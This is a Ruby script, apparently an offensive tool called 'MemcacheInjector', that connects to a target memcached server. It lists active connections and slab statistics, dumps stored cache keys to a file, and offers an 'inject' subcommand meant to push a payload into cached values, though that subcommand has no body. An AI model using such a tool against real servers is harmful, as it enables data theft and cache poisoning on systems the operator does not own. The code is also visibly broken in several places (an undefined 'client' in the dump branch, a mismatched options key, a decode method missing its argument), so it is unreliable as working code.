require 'uri'
require 'zlib'
require 'socket'
require 'optparse'

class MemcacheInjector
  class SocketWrapper
    EOF   = "\r\nEND\r\n"
    ERROR = "ERROR"

    class Error < Exception; end

    def initialize(socket)
      @socket = socket
    end

    def write(data)
      @socket.write("#{data}\r\n")
    end

    def read
      String.new.tap do |data|
        loop do
          data << @socket.recv(1028)

          raise Error.new if data.include?(ERROR)
          break if data.include?(EOF)
        end
      end
    end

    def send(data)
      write(data)
      read[0..-8].split("\r\n")
    end

    def send_and_expect_list(data, delimiter)
      send(data).map do |item|
        item.split("#{delimiter.to_s.upcase} ")[1]
      end
    end
  end

  class NoOpEncoder
    def encode(data); data; end
    def decode(data); data; end
  end

  class GzipEncoder
    def encode(data)
      io = StringIO.new("w")
      Zlib::GzipWriter.new(io).write(data).close
      io.string
    end

    def decode(data)
      io = StringIO.new(data, "rb")
      Zlib::GzipReader.new(io).read
    end
  end

  class GlibEncoder
    def encode(data)
      Zlib::Deflate.deflate(data)
    end

    def decode
      Zlib::Inflate.inflate(data)
    end
  end

  attr_reader :output, :slabs, :keys

  def initialize(host, port, output, opts = {})
    @socket  = SocketWrapper.new(TCPSocket.new(host, port))
    @opts    = {
      encoder: NoOpEncoder.new,
      regex: nil,
      keys_per_slab: 10000
    }.merge(opts)
    @output  = output
    @conns   = Array.new
    @slabs   = Hash.new
    @keys    = Array.new
  end

  def get_general_stats
    items = @socket.send_and_expect_list("stats", :stat)
    stats = {}

    items.each do |item|
      id, stat = item.split(' ', 2)

      if id && stat
        stats[id] = stat
      end
    end

    stats
  end

  def get_active_connections
    conns = get_stats_of_type(:conns)
    @conns << conns
    conns
  end

  def get_slab_info
    slabs = get_stats_of_type(:slabs)
    @slabs.merge!(slabs)
    slabs
  end

  def dump_keys_from_slab(i)
    items = @socket.send_and_expect_list("stats cachedump #{i} #{@opts[:keys_per_slab]}", :item)
    keys = []

    items.each do |item|
      keys << item.split('ITEM ')[0].split(' ')[0]
    end

    @keys << keys
    keys
  end

  def write_keys_to_output
    @output.print(@keys.join("\r\n"))
  end

  private

  def get_stats_of_type(type)
    items = @socket.send_and_expect_list("stats #{type.to_s}", :stat)
    stats = {}

    items.map do |item|
      stat = item.split(':', 2)

      next if stat.size != 2

      id  = stat[0].to_i
      val = stat[-1..1][0]
      val = val.split

      val_id   = val[0]
      val_data = val[-1..1].join(' ')

      stats[id] ||= Hash.new
      stats[id][val_id] = val_data
    end

    stats
  end
end

options = {}
subcommands = {
  :_ => OptionParser.new do |opts|
    opts.banner = "Usage: memcached_injector dump|inject|stats [options]"
  end,
  "dump" => OptionParser.new do |opts|
    opts.banner = "Dumps the contents of a memcached instance\r\n\r\n" +
                  "Usage: memcached_injector dump options"
    opts.on("-h", "--help", "Display this message") do
      puts opts
      exit
    end
    opts.on("-t", "--target HOSTNAME", String, "Target hostname") do |hostname|
      options[:target] = hostname
    end
    opts.on("-o", "--out [FILE]", String, "File to write dump to") do |file|
      options[:output] = file
    end
    opts.on("-k", "--key [REGEX]", Regexp, "Regex to filter keys by") do |regex|
      options[:key] = regex
    end
    opts.on("-v", "--value [REGEX]", Regexp, "Regex to filter values by") do |regex|
      options[:value] = regex
    end
  end,
  "inject" => OptionParser.new do |opts|
    opts.banner = "Injects a payload into contents of a memcached instance\r\n\r\n" +
                  "Usage: memcached_injector inject options"
    opts.on("-h", "--help", "Display this message") do
      puts opts
      exit
    end
    opts.on("-t", "--target HOSTNAME", String, "Target hostname") do |hostname|
      options[:target] = hostname
    end
    opts.on("-p", "--payload STRING", String, "Payload") do |str|
      options[:payload] = str
    end
    opts.on("-k", "--key [REGEX]", Regexp, "Regex to filter keys by") do |regex|
      options[:key] = regex
    end
    opts.on("-v", "--value [REGEX]", Regexp, "Regex to filter values by") do |regex|
      options[:value] = regex
    end
  end,
  "stats" => OptionParser.new do |opts|
    opts.banner = "Usage: memcached_injector stats options"
    opts.on("-h", "--help", "Display this message") do
      puts opts
      exit
    end
    opts.on("-t", "--target HOSTNAME", String, "Target hostname") do |hostname|
      options[:target] = hostname
    end
  end
}

subcommands[:_].order!
subcommand = ARGV.shift

if subcommands[subcommand]
  subcommands[subcommand].order!
end

case subcommand
when "dump"
  unless options.keys.include?(:target)
    puts subcommands["dump"].help
    exit
  end

  client.slabs.each do |i, slab|
    print "Starting dump of keys in slab ##{i}..."
    dump = client.dump_keys_from_slab(i)
    puts " Got #{dump.count} key(s)."
  end

  puts "Exporting found keys to #{client.output.path}..."
  client.write_keys_to_output

when "inject"
  unless options.keys.include?(:target) && options.keys.include?(:payload)
    puts subcommands["inject"].help
    exit
  end

when "stats"
  unless options.keys.include?(:target)
    puts subcommands["stats"].help
    exit
  end

  client = MemcacheInjector.new(options["target"], 11211, nil)

  puts ""
  puts "------------------"
  puts "Active Connections"
  puts "------------------"

  client.get_active_connections.each do |i, stat|
    puts "#{stat['addr']} in #{stat['state']} state for #{stat['secs_since_last_cmd']}s"
  end

  puts ""
  puts "----------"
  puts "Slab Stats"
  puts "----------"

  client.get_slab_info.each do |i, stat|
    memory = stat['chunk_size'].to_i * stat['chunks_per_page'].to_i * stat['total_pages'].to_i
    puts "##{i}: #{stat['used_chunks']}/#{stat['total_chunks']} chunks (allocated #{memory}B)"
  end
else
  # Unrecognized command
  puts subcommands[:_].help
end
